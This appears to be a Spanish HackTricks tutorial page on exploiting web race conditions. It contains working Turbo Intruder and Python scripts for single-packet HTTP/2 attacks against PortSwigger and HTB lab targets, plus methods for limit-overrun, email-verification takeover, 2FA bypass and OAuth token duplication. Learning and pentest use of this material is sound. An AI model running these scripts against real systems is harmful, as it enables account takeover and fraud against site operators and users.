# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Para obtener una comprensión profunda de esta técnica, consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Mejoras en ataques de Race Condition

El principal obstáculo para aprovechar las race conditions es asegurarse de que múltiples requests sean procesadas al mismo tiempo, con una diferencia en sus tiempos de procesamiento muy pequeña — idealmente, menos de 1ms.

Aquí puedes encontrar algunas técnicas para sincronizar requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Soporta enviar dos requests sobre una única conexión TCP, reduciendo el impacto del jitter de red. Sin embargo, debido a variaciones en el lado del servidor, dos requests pueden no ser suficientes para un exploit consistente de race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Permite pre-enviar la mayor parte de 20-30 requests, reteniendo un pequeño fragmento, que luego se envía junto, logrando la llegada simultánea al servidor.

**Preparación para Last-Byte Sync** implica:

1. Enviar headers y datos del body menos el byte final sin cerrar el stream.
2. Pausar 100ms después del envío inicial.
3. Desactivar TCP_NODELAY para aprovechar el algoritmo de Nagle y agrupar los frames finales.
4. Hacer ping para precalentar la conexión.

El posterior envío de los frames retenidos debería resultar en su llegada en un único paquete, verificable con Wireshark. Este método no aplica a archivos estáticos, que típicamente no están involucrados en RC attacks.

### Adaptación a la arquitectura del servidor

Entender la arquitectura del objetivo es crucial. Los front-end servers pueden enrutar las requests de forma distinta, afectando la sincronización. El precalentamiento de conexiones en el lado del servidor, mediante requests sin importancia, puede normalizar el timing de las requests.

#### Manejo del bloqueo basado en sesión

Frameworks como el session handler de PHP serializan los requests por session, lo que puede ocultar vulnerabilidades. Utilizar distintos session tokens para cada request puede eludir este problema.

#### Superar límites de rate o recursos

Si el precalentamiento de conexiones no funciona, inducir deliberadamente retrasos en el servidor web mediante una avalancha de requests dummy podría facilitar el single-packet attack al provocar una demora en el lado del servidor favorable a las race conditions.

## Ejemplos de ataque

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Puedes enviar la request a **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), puedes cambiar en la request el valor que quieres brute force para **`%s`** como en `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` y luego seleccionar el **`examples/race-single-packer-attack.py`** desde el desplegable:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Si vas a **enviar valores diferentes**, podrías modificar el código con este que usa una wordlist desde el clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Si el sitio no soporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: En caso de que necesites enviar una request a 1 endpoint y luego varias a otros endpoints para desencadenar la RCE, puedes cambiar el script `race-single-packet-attack.py` con algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- También está disponible en **Repeater** a través de la nueva opción '**Send group in parallel**' en Burp Suite.
- Para **limit-overrun** podrías simplemente añadir la **same request 50 times** en el **group**.
- Para **connection warming**, podrías **add** al **beginning** del **group** algunas **requests** a alguna parte no estática del servidor web.
- Para **delaying** el proceso **between** procesar **one request and another** en un flujo de 2 substates, podrías **add extra requests between** ambas **requests**.
- Para un **multi-endpoint** RC podrías empezar enviando la **request** que **goes to the hidden state** y luego **50 requests** justo después que **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: El objetivo de este script es cambiar el email de un usuario mientras lo verifica continuamente hasta que el verification token del nuevo email llegue al último email (esto es porque en el código se observó un RC donde era posible modificar un email pero que la verificación se enviara al antiguo porque la variable indicando el email ya estaba poblada con el primero).\
Cuando la palabra "objetivo" se encuentra en los emails recibidos sabemos que recibimos el verification token del email cambiado y terminamos el ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: notas sobre el motor y el gating

- Selección del motor: usa `Engine.BURP2` en objetivos HTTP/2 para trigger the single‑packet attack; vuelve a `Engine.THREADED` o `Engine.BURP` para HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: encola muchas copias con `gate='race1'` (o per‑attempt gates), lo que retiene la tail de cada request; `openGate('race1')` flushes todas las tails juntas para que lleguen casi simultáneamente.
- Diagnóstico: marcas de tiempo negativas en Turbo Intruder indican que el servidor respondió antes de que la request se enviara por completo, demostrando solapamiento. Esto es esperado en condiciones de carrera reales.
- Calentamiento de la conexión: envía un ping o unas cuantas requests inofensivas primero para estabilizar los timings; opcionalmente desactiva `TCP_NODELAY` para fomentar el batching de los frames finales.


### Mejorando Single Packet Attack

En la investigación original se explica que este ataque tiene un límite de 1,500 bytes. Sin embargo, en [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), se explica cómo es posible extender la limitación de 1,500 bytes del single packet attack hasta la **65,535 B window limitation of TCP by using IP layer fragmentation** (dividiendo un solo paquete en múltiples paquetes IP) y enviándolos en orden diferente, lo que impide reensamblar el paquete hasta que todos los fragmentos lleguen al servidor. Esta técnica permitió al investigador enviar 10,000 requests en unos 166ms.

Ten en cuenta que, aunque esta mejora hace el ataque más fiable en RC que requiere cientos/miles de packets para llegar al mismo tiempo, también puede tener algunas limitaciones de software. Algunos servidores HTTP populares como Apache, Nginx y Go tienen un ajuste estricto `SETTINGS_MAX_CONCURRENT_STREAMS` a 100, 128 y 250. Sin embargo, otros como NodeJS y nghttp2 lo tienen ilimitado.\
Esto básicamente significa que Apache solo considerará 100 conexiones HTTP desde una única conexión TCP (limitando este RC attack).

Puedes encontrar algunos ejemplos usando esta técnica en el repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Antes de la investigación anterior, estos eran algunos payloads usados que simplemente intentaban enviar los packets lo más rápido posible para causar un RC.

- **Repeater:** Consulta los ejemplos de la sección anterior.
- **Intruder**: Envía la **request** a **Intruder**, configura el **number of threads** a **30** dentro del **Options menu and,** selecciona como payload **Null payloads** y genera **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodología RC**

### Limit-overrun / TOCTOU

Este es el tipo más básico de race condition donde **vulnerabilities** que **aparecen** en lugares que **limitan el número de veces que puedes realizar una acción**. Como usar el mismo código de descuento en una tienda web varias veces. Un ejemplo muy sencillo se puede encontrar en [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**this bug**](https://hackerone.com/reports/759247)**.**

Hay muchas variaciones de este tipo de ataque, incluyendo:

- Canjear una tarjeta regalo varias veces
- Calificar un producto varias veces
- Retirar o transferir dinero en exceso del saldo de tu cuenta
- Reutilizar una única solución CAPTCHA
- Eludir un rate limit anti-brute-force

### **Subestados ocultos**

Explotar race conditions complejas a menudo implica aprovechar breves oportunidades para interactuar con subestados de máquina ocultos o **no intencionados**. Aquí tienes cómo abordarlo:

1. **Identificar posibles subestados ocultos**
- Comienza identificando endpoints que modifiquen o interactúen con datos críticos, como perfiles de usuario o procesos de restablecimiento de contraseña. Concéntrate en:
- **Almacenamiento**: Prefiere endpoints que manipulen datos persistentes server-side por encima de los que manejan datos client-side.
- **Acción**: Busca operaciones que alteren datos existentes, que son más propensas a crear condiciones explotables en comparación con las que añaden nuevos datos.
- **Keying**: Los ataques exitosos suelen involucrar operaciones que usan la misma clave/identificador, p. ej., username o reset token.
2. **Realizar sondeos iniciales**
- Prueba los endpoints identificados con ataques de race condition, observando cualquier desviación respecto a los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicación pueden indicar una vulnerabilidad.
3. **Demostrar la vulnerabilidad**
- Reduce el ataque al número mínimo de requests necesarias para explotarlo, a menudo solo dos. Este paso puede requerir múltiples intentos o automatización debido al timing preciso involucrado.

### Time Sensitive Attacks

La precisión en el timing de las requests puede revelar vulnerabilidades, especialmente cuando se usan métodos predecibles como timestamps para tokens de seguridad. Por ejemplo, generar password reset tokens basados en timestamps podría permitir tokens idénticos para requests simultáneas.

**Para explotar:**

- Usa timing preciso, como un ataque de un solo paquete, para hacer requests concurrentes de password reset. Tokens idénticos indican una vulnerabilidad.

**Ejemplo:**

- Solicita dos password reset tokens al mismo tiempo y compáralos. Tokens coincidentes sugieren un fallo en la generación de tokens.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Estudios de caso de subestados ocultos

### Pay & add an Item

Check this [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver cómo **pay** en una tienda y **add an extra** item que **no tendrás que pagar**.

### Confirm other emails

La idea es **verificar una dirección de correo y cambiarla a otra diferente al mismo tiempo** para averiguar si la plataforma verifica la nueva dirección cambiada.

### Change email to 2 emails addresses Cookie based

Según [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab fue vulnerable a una takeover de esta manera porque podría **send** el **email verification token de un email a otro email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Si se usan **2 escrituras diferentes** para **añadir** **información** dentro de una **base de datos**, hay un pequeño lapso de tiempo en el que **solo los primeros datos han sido escritos** en la base de datos. Por ejemplo, al crear un usuario el **username** y la **password** podrían ser **escritos** y **luego el token** para confirmar la cuenta recién creada es escrito. Esto significa que durante un pequeño tiempo el **token para confirmar una cuenta es null**.

Por lo tanto, **registrar una cuenta y enviar varias requests con un token vacío** (`token=` o `token[]=` o cualquier otra variación) para confirmar la cuenta de inmediato podría permitir **confirmar una cuenta** donde no controlas el email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

El siguiente pseudo-code es vulnerable a race condition porque en un tiempo muy pequeño la **2FA no se aplica** mientras se crea la sesión:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistencia eterna

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Estos servicios te permiten crear una aplicación y autenticar usuarios que el provider ha registrado. Para ello, el **client** necesitará **permitir que tu aplicación** acceda a parte de sus datos dentro del **OAUth provider**.\
Así que, hasta aquí es solo un login común con google/linkedin/github... donde se te muestra una página que dice: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

El **problema** aparece cuando la **aceptas** y se envía automáticamente un **`authorization_code`** a la aplicación maliciosa. Entonces, esta **aplicación abusa de una Race Condition en el OAUth service provider para generar más de un AT/RT** (_Authentication Token/Refresh Token_) a partir del **`authorization_code`** para tu cuenta. Básicamente, aprovechará el hecho de que aceptaste que la aplicación accediera a tus datos para **crear varias cuentas**. Luego, si **dejas de permitir que la aplicación acceda a tus datos, un par de AT/RT será eliminado, pero los otros seguirán siendo válidos**.

#### Race Condition in `Refresh Token`

Una vez que has **obtenido un RT válido** podrías intentar **abusar de él para generar varios AT/RT** e **incluso si el usuario cancela los permisos** de la aplicación maliciosa para acceder a sus datos, **varios RT seguirán siendo válidos.**

## **RC en WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) puedes encontrar un PoC en Java para enviar mensajes websocket en **parallel** y abusar de **Race Conditions también en Web Sockets**.
- Con Burp’s WebSocket Turbo Intruder puedes usar el motor **THREADED** para generar múltiples conexiones WS y disparar payloads en paralelo. Parte del ejemplo oficial y ajusta `config()` (thread count) para la concurrencia; esto suele ser más fiable que agrupar en una sola conexión cuando se compite por el estado del servidor a través de handlers WS. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Referencias

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
